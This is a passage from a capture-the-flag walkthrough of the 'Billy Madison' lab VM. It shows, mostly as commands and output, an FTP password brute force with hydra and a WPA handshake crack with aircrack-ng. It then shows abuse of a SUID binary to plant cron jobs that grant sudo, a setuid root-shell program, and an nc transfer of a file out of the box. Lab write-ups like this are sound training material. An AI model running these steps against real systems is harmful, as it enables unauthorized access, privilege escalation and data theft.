i used `hydra` with the password list i made from `rockyou` matching Veronica to brute force the `ftp` account

```bash
root@kali:~/BM# hydra -l veronica -P ./veronica.txt 192.168.93.151 ftp
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-09-22 08:53:10
[DATA] max 16 tasks per 1 server, overall 64 tasks, 1546 login tries (l:1/p:1546), ~1 try per task
[DATA] attacking service ftp on port 21
[21][ftp] host: 192.168.93.151   login: veronica   password: babygirl_veronica07@yahoo.com
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2016-09-22 08:53:31
```

lets log in

```bash
root@kali:~/BM# ftp 192.168.93.151
Connected to 192.168.93.151.
220 Welcome to ColoradoFTP - the open source FTP server (www.coldcore.com)
Name (192.168.93.151:root): veronica
331 User name okay, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
ftp> ls
200 PORT command successful.
150 Opening A mode data connection for /.
-rwxrwxrwx 1 ftp 595 Aug 20 12:55 email-from-billy.eml
-rwxrwxrwx 1 ftp 719128 Aug 17 12:16 eg-01.cap
226 Transfer completed.
ftp>
```

and download everything like before

```bash
ftp> mget *
mget email-from-billy.eml? y
200 PORT command successful.
150 Opening A mode data connection for email-from-billy.eml.
226 Transfer completed for "email-from-billy.eml".
616 bytes received in 0.15 secs (3.9653 kB/s)
mget eg-01.cap? y
200 PORT command successful.
150 Opening A mode data connection for eg-01.cap.
226 Transfer completed for "eg-01.cap".
722969 bytes received in 0.39 secs (1.7459 MB/s)
ftp> 221 Logged out, closing control connection.
```

### wifi password

the email from veronica's ftp folder shows

```bash
root@kali:~/BM# file ./email-from-billy.eml
./email-from-billy.eml: ASCII text
root@kali:~/BM# cat email-from-billy.eml
        Sat, 20 Aug 2016 12:55:45 -0500 (CDT)
Date: Sat, 20 Aug 2016 12:55:40 -0500
To: vvaughn@polyfector.edu
From: billy@madisonhotels.com
Subject: test Sat, 20 Aug 2016 12:55:40 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
Eric's wifi

Hey VV,

It's your boy Billy here.  Sorry to leave in the middle of the night but I wanted to crack Eric's wireless and then mess with him.
I wasn't completely successful yet, but at least I got a start.

I didn't walk away without doing my signature move, though.  I left a flaming bag of dog poo on his doorstep. :-)

Kisses,

Billy
```

looking at the `.cap` file

```bash
root@kali:~/BM# file ./eg-01.cap
./eg-01.cap: tcpdump capture file (little-endian) - version 2.4 (802.11, capture length 65535)

root@kali:~/BM# tcpdump -r ./eg-01.cap
reading from file ./eg-01.cap, link-type IEEE802_11 (802.11)
tcpdump: pcap_loop: bogus savefile header

root@kali:~/BM# tshark -r ./eg-01.cap
Running as user "root" and group "root". This could be dangerous.
tshark: Lua: Error during loading:
 [string "/usr/share/wireshark/init.lua"]:44: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.

tshark: The file "./eg-01.cap" appears to be damaged or corrupt.
(pcap: File has 3120562176-byte packet, bigger than maximum of 262144)
```

even in wireshark too
`The capture file appears to be damaged or corrupt. (pcap: File has 3120562176-byte packet, bigger than maximum of 262144)`

hmmm

ah ha may need binary mode [https://ask.wireshark.org/questions/5924/error-in-pcap-file](https://ask.wireshark.org/questions/5924/error-in-pcap-file)

```bash
ftp> binary
200 Type set to I
ftp> get eg-01.cap
local: eg-01.cap remote: eg-01.cap
200 PORT command successful.
150 Opening I mode data connection for eg-01.cap.
226 Transfer completed for "eg-01.cap".
719128 bytes received in 0.52 secs (1.3264 MB/s)
ftp> 221 Logged out, closing control connection.
```

can i read it this time ?

```bash
root@kali:~/BM# tcpdump -r ./eg-01.cap
reading from file ./eg-01.cap, link-type IEEE802_11 (802.11)
12:41:55.901162 Beacon (EricGordon) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 11, PRIVACY
12:41:55.901674 Data IV: 7d Pad 20 KeyID 1
12:41:55.901678 Acknowledgment RA:74:da:38:66:1d:63 (oui Unknown)
12:41:56.357930 Data IV: 7e Pad 20 KeyID 1
12:41:58.130602 Action (02:13:37:a5:52:2e (oui Unknown)): BA DELBA
12:41:58.131082 Acknowledgment RA:02:13:37:a5:52:2e (oui Unknown)
12:42:02.597548 Data IV: 81 Pad 20 KeyID 1
12:42:06.600076 Request-To-Send TA:74:da:38:66:1d:63 (oui Unknown)
12:42:06.601104 Request-To-Send TA:74:da:38:66:1d:63 (oui Unknown)
12:42:06.601134 Clear-To-Send RA:74:da:38:66:1d:63 (oui Unknown)
12:42:06.601134 Acknowledgment RA:74:da:38:66:1d:63 (oui Unknown)
```

looks like it, now from the contents of the file it looks like a wireless auth capture.

```bash
root@kali:~/BM# aircrack-ng -w /usr/share/wordlists/rockyou.txt eg-01.cap
Opening eg-01.cap
Read 13003 packets.

   #  BSSID              ESSID                     Encryption

   1  02:13:37:A5:52:2E  EricGordon                WPA (1 handshake)

Choosing first network as target.

Opening eg-01.cap
Reading packets, please wait...

                                 Aircrack-ng 1.2 rc4

      [00:15:10] 1699628/9822768 keys tested (1651.56 k/s)

      Time left: 1 hour, 22 minutes, 0 seconds                  17.30%

                           KEY FOUND! [ triscuit* ]


      Master Key     : 9E 8B 4F E6 CC 5E E2 4C 46 84 D2 AF 59 4B 21 6D
                       B5 3B 52 84 04 9D D8 D8 83 67 AF 43 DC 60 CE 92

      Transient Key  : 7A FA 82 59 5A 9A 23 6E 8C FB 1D 4B 4D 47 BE 13
                       D7 AC AC 4C 81 0F B5 A2 EE 2D 9F CC 8F 05 D2 82
                       BF F4 4E AE 4E C9 ED EA 31 37 1E E7 29 10 13 92
                       BB 87 8A AE 70 95 F8 62 20 B5 2B 53 8D 0C 5C DC

      EAPOL HMAC     : 86 63 53 4B 77 52 82 0C 73 4A FA CA 19 79 05 33
```

### access

ok so it looks like i have to ssh on port `1974` and the password `triscuit*` and i can only assume the user is `eric` by the ESSID

```bash
root@kali:~/BM# ssh -p 1974 192.168.93.151 -l eric
eric@192.168.93.151's password:
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-38-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

43 packages can be updated.
0 updates are security updates.


Last login: Sat Aug 20 22:28:28 2016 from 192.168.3.101
eric@BM:~$
```
### escalation

lets look around first

```bash
eric@BM:~$ cat ./why-1974.txt
Why 1974?  Because: http://www.metacafe.com/watch/an-VB9KuJtnh4bn/billy_madison_1995_billy_hangs_out_with_friends/
```
found out what was going on with port 69   

```
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root       4471  0.0  0.5  68732 20804 ?        S    10:28   0:00 python /opt/wp/wordpot.py --host=192.168.93.151 --port=69
```

found out about telnet

```bash
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root       4954  0.0  0.0   4508   708 ?        Ss   10:40   0:00 /bin/sh -c /root/telnet.sh
root       4958  0.0  0.0   4508   692 ?        S    10:40   0:00 /bin/sh /root/telnet.sh
root       4974  0.0  0.2  34708 10424 ?        S    10:40   0:00 python2 /opt/honeyports/honeyports-0.4.py -p 23
```

time for an enumeration script

```bash
eric@BM:~$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2016-09-22 11:04:00--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.60.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.60.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 40155 (39K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                        100%[==========================================================>]  39.21K  --.-KB/s    in 0.05s

2016-09-22 11:04:00 (821 KB/s) - ‘LinEnum.sh’ saved [40155/40155]

eric@BM:~$ chmod +x ./LinEnum.sh
```


i ran that script with through tests enabled and some interesting results

```bash
SUID files:
/usr/local/share/sgml/donpcgd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chfn
/usr/bin/ubuntu-core-launcher
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/mount
/bin/su
/bin/umount
/bin/fusermount
/bin/ping6
/bin/ping
/bin/ntfs-3g
```

anything in `/usr/local/share/` i'll always check.

```bash
eric@BM:~$ ls -la /usr/local/share/sgml/donpcgd
-r-sr-s--- 1 root eric 372922 Aug 20 22:35 /usr/local/share/sgml/donpcgd
eric@BM:~$ /usr/local/share/sgml/donpcgd
Usage: /usr/local/share/sgml/donpcgd path1 path2
```

looks good here

so the usage for this is not really helpful so i'll try and see what i can put with `path1` and `path2`

```bash
eric@BM:~$ /usr/local/share/sgml/donpcgd /dev/null ~/testing
#### mknod(/home/eric/testing,21b6,103)
eric@BM:~$ ls -la testing
crw-rw-rw- 1 root root 1, 3 Sep 23 03:26 testing
```

```bash
eric@BM:~$ /usr/local/share/sgml/donpcgd /etc/passwd /opt/test
#### mknod(/opt/test,81a4,0)
eric@BM:~$ ls -la /opt/test
-rw-r--r-- 1 root root 0 Sep 23 03:34 /opt/test
```

ohh this looks good

lets try to manipulate this, i've created the following binary

```c
eric@BM:~$ echo -e 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/bash");\n} '' >> /tmp/test.c
eric@BM:~$ cat /tmp/test.c
int main(void){
setresuid(0, 0, 0);
system("/bin/bash");
}
```

i now need `root` to compile it

i make the following compile script

```bash
eric@BM:~$ echo -e '#!/bin/bash\ngcc /tmp/test.c -o /tmp/root\nchmod +x /tmp/root' >> /tmp/test.sh
eric@BM:~$ cat /tmp/test.sh
#!/bin/bash
gcc /tmp/test.c -o /tmp/root
chmod +x /tmp/root
```

trying the payload

```bash
eric@BM:~$ /usr/local/share/sgml/donpcgd /tmp/test.sh /etc/cron.hourly/test
#### mknod(/etc/cron.hourly/test,81b4,0)
eric@BM:~$ cat /etc/cron.hourly/test
```
hmm so the contents of the script was not copied, not to worry as `eric` can write to the new file now

```bash
eric@BM:~$  echo -e '#!/bin/bash\ngcc /tmp/test.c -o /tmp/root\nchmod +x /tmp/root' >> /etc/cron.hourly/test
eric@BM:~$ cat /etc/cron.hourly/test
#!/bin/bash
gcc /tmp/test.c -o /tmp/root
chmod +x /tmp/root
```

wait a bit

```bash
eric@BM:~$ sleep 3600

eric@BM:~$
eric@BM:~$ ls -l /tmp/
total 44
drwxr-xr-x 2 root root 4096 Sep 23 02:47 hsperfdata_root
-rwxr-xr-x 1 root root 8656 Sep 23 05:17 root
drwx------ 3 root root 4096 Sep 23 02:47 systemd-private-6b8d1f109a10455296c7a8bc769e017e-systemd-timesyncd.service-oKv41e
-rw-rw-r-- 1 eric eric   60 Sep 23 04:10 test.c
-rw-rw-r-- 1 eric eric   60 Sep 23 04:15 test.sh
-rwxrwxr-x 1 eric eric 8656 Sep 23 04:11 try1
drwx------ 2 root root 4096 Sep 23 02:47 vmware-root
```
we have a new file `root`

```bash
eric@BM:~$ /tmp/root
eric@BM:~$ id
uid=1002(eric) gid=1002(eric) groups=1002(eric)
```
well that was a long wait for that to fail.

### escalation again

ok so from the fail first time around i know i can execute as `root` (just have to wait an hour). maybe if i give eric sudo permissions

```bash
eric@BM:~$ touch sudoers
eric@BM:~$ /usr/local/share/sgml/donpcgd ~/sudoers /etc/cron.hourly/sudoers
#### mknod(/etc/cron.hourly/sudoers,81b4,0)
eric@BM:~$ echo -e '#!/bin/bash\necho "eric ALL=(ALL) NOPASSWD:ALL" >>/etc/sudoers' >> /etc/cron.hourly/sudoers
eric@BM:~$ chmod +x /etc/cron.hourly/sudoers
eric@BM:~$ sleep 3600
```

can i sudo ?

```bash
eric@BM:~$ sudo su
root@BM:/home/eric# id
uid=0(root) gid=0(root) groups=0(root)
```

looks like it, i really want to know why my first attempt failed, but i could not work it out. Anyway this box is now rooted, but on with the story

### flag

lots of scripts in roots home dir

```bash
root@BM:~# ls -al
total 92
drwx------  8 root root 4096 Sep 23 09:10 .
drwxr-xr-x 25 root root 4096 Sep 21 15:54 ..
-rw-------  1 root root   61 Sep 23 09:10 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  3 root root 4096 Aug 11 22:30 .cache
drwxr-xr-x  2 root root 4096 Aug 22 21:24 checkban
-rwxr-xr-x  1 root root  112 Aug 21 22:11 cleanup.sh
-rwxr-xr-x  1 root root   59 Aug 21 22:12 ebd.sh
-rw-r--r--  1 root root   35 Aug 21 16:51 ebd.txt
-rwxr-xr-x  1 root root  102 Aug 20 12:45 email.sh
-rwxr-xr-x  1 root root   63 Aug 19 17:26 ftp.sh
-rwxr-xr-x  1 root root 1020 Aug 20 14:00 fwconfig.sh
drwx------  2 root root 4096 Aug 21 15:58 .gnupg
drwxr-xr-x  3 root root 4096 Aug 12 22:53 .m2
drwxr-xr-x  2 root root 4096 Aug 11 22:17 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Aug 15 10:16 .selected_editor
drwxr-xr-x  2 root root 4096 Aug 22 21:19 ssh
-rwxr-xr-x  1 root root   33 Aug 11 22:51 ssh.sh
-rwxr-xr-x  1 root root   69 Aug 15 20:54 startup.sh
-rwxr-xr-x  1 root root  122 Aug 17 22:55 telnet.sh
-rw-r--r--  1 root root  222 Aug 20 21:58 .wget-hsts
-rwxr-xr-x  1 root root  230 Aug 16 17:08 wp.sh
```

three cron jobs

```bash
# m h  dom mon dow   command
*/1 * * * * /root/checkban/checkban.sh
*/10 * * * * /root/telnet.sh
*/1 * * * * /root/ssh/canyoussh.sh
```

#### PRIVATE

theres a directory at `/PRIVATE` that looks to include the report

```bash
root@BM:/PRIVATE# file ./BowelMovement
./BowelMovement: data
root@BM:/PRIVATE# cat hint.txt
Heh, I called the file BowelMovement because it has the same initials as
Billy Madison.  That truely cracks me up!  LOLOLOL!

I always forget the password, but it's here:

https://en.wikipedia.org/wiki/Billy_Madison

-EG
root@BM:/PRIVATE#
```

so lets copy this to my kali and make a wordlist from that site

```bash
root@BM:/PRIVATE# cat BowelMovement | nc 192.168.93.149 4444
```

```bash
root@kali:~/BM# nc -nlvp 4444 > BowelMovement
listening on [any] 4444 ...
connect to [192.168.93.149] from (UNKNOWN) [192.168.93.151] 38906
```

```bash
root@kali:~/BM# cewl -d 1 -w Bowl.txt https://en.wikipedia.org/wiki/Billy_Madison
CeWL 5.2 (Some Chaos) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

ok only thing left to do is know what type of file `BowelMovement` is

```bash
root@kali:~/BM# file ./BowelMovement
./BowelMovement: data
```

oh very informative

i'm going to take that the last line in the hint means its a truecrypt file

>That truely cracks me up!  LOLOLOL!

```bash
root@kali:~/BM# truecrack -t ./BowelMovement -w ./Bowl.txt
TrueCrack v3.0
Website: http://code.google.com/p/truecrack
Contact us: infotruecrack@gmail.com
Found password:		"execrable"
Password length:	"10"
Total computations:	"8033"
```

now to open this file google showed that i need vera crypt to open a true crypt file

```bash
wget "https://download-codeplex.sec.s-msft.com/Download/Release?ProjectName=veracrypt&DownloadId=1601964&FileTime=131159523650070000&Build=21031"
--2016-09-23 10:45:20--  https://download-codeplex.sec.s-msft.com/Download/Release?ProjectName=veracrypt&DownloadId=1601964&FileTime=131159523650070000&Build=21031
Resolving download-codeplex.sec.s-msft.com (download-codeplex.sec.s-msft.com)... 104.82.207.204, 104.82.207.204
Connecting to download-codeplex.sec.s-msft.com (download-codeplex.sec.s-msft.com)|104.82.207.204|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17057701 (16M) [application/octet-stream]
Saving to: ‘Release?ProjectName=veracrypt&DownloadId=1601964&FileTime=131159523650070000&Build=21031’

Release?ProjectName=veracrypt&Dow 100%[==========================================================>]  16.27M  2.95MB/s    in 5.3s

2016-09-23 10:45:26 (3.06 MB/s) - ‘Release?ProjectName=veracrypt&DownloadId=1601964&FileTime=131159523650070000&Build=21031’ saved [17057701/17057701]
```

```bash
root@kali:~/BM# mv Release\?ProjectName\=veracrypt\&DownloadId\=1601964\&FileTime\=131159523650070000\&Build\=21031  veracrypt-1.18-setup.tar.bz2
```

installed !! :)

```bash
root@kali:~/BM# veracrypt -tc ./BowelMovement
Enter mount directory [default]:
Enter password for /root/BM/BowelMovement:
Enter keyfile [none]:
Protect hidden volume (if any)? (y=Yes/n=No) [No]:
```

copy the zip from that mount to my working dir

`root@kali:~/BM# cp  /media/veracrypt1/secret.zip  .`

then unzip it

```bash

root@kali:~/BM# unzip ./secret.zip
Archive:  ./secret.zip
  inflating: Billy_Madison_12th_Grade_Final_Project.doc
  inflating: THE-END.txt
root@kali:~/BM#
```

and finally the flag

```
root@kali:~/BM# cat ./Billy_Madison_12th_Grade_Final_Project.doc
Billy Madison
Final Project
Knibb High



                                       The Industrial Revolution

The Industrial Revolution to me is just like a story I know called "The Puppy Who Lost His Way."
The world was changing, and the puppy was getting... bigger.

So, you see, the puppy was like industry. In that, they were both lost in the woods.
And nobody, especially the little boy - "society" - knew where to find 'em.
Except that the puppy was a dog.
But the industry, my friends, that was a revolution.

KNIBB HIGH FOOTBALL RULES!!!!!

https://www.youtube.com/watch?v=BlPw6MKvvIc

-BM
```

```
root@kali:~/BM# cat ./THE-END.txt
Congratulations!

If you're reading this, you win!

I hope you had fun.  I had an absolute blast putting this together.

I'd love to have your feedback on the box - or at least know you pwned it!

Please feel free to shoot me a tweet or email (7ms@7ms.us) and let me know with
the subject line: "Stop looking at me swan!"

Thanks much,

Brian Johnson
7 Minute Security
www.7ms.us
```
